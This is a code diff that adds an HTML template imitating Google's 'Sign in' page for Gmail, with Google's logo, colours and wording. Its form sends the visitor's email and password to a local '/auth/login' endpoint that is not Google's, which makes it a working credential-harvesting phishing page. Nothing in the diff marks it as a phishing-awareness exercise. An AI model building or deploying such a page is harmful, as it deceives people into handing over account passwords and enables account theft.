@@ -1,0 +1,31 @@
+<html>
+<head>
+    <title>Sign in - Google Accounts</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fff; }
+        .card { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; width: 450px; text-align: center; }
+        .logo { width: 75px; height: 24px; margin-bottom: 16px; }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; margin-top: 0; }
+        p { font-size: 16px; color: #202124; margin-bottom: 40px; }
+        input { width: 100%; padding: 13px 15px; margin-bottom: 24px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; color: #202124; box-sizing: border-box; }
+        input:focus { border-color: #1a73e8; outline: none; }
+        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; float: right; }
+        button:hover { background-color: #287ae6; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+        <h1>Sign in</h1>
+        <p>to continue to Gmail</p>
+        <form action="/auth/login" method="POST">
+            <input type="email" name="email" placeholder="Email or phone" required value="{{ email }}">
+            <input type="password" name="password" placeholder="Enter your password" required>
+            <div style="overflow: hidden; margin-top: 20px;">
+                <button type="submit">Next</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
